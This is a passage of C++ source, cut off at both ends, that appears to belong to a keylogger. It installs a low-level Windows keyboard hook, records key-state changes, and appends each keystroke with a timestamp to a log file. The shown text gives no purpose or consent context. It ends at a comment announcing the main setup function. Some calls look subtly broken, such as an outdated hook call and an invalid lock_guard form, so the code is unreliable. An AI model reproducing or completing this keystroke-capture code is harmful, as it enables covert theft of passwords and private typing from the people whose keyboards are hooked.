            }

            lastKeyState[uChar] = currentKeyState[uChar];
        }
    }

    // Update the hook if necessary
    if (hKeyboardHook == NULL) {
        hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, HandleKeyPress);
    }
}

// Function to log each keystroke with timestamp
void LogKeystroke(string key, int timestamp) {
    mutex::lock_guard lock(kbMutex);
    ofstream file(logFile, ios::app);
    file << timestamp << ", " << key << endl;
    file.close();
    keystrokesLogged++;
}

// Main function to set up and start logging
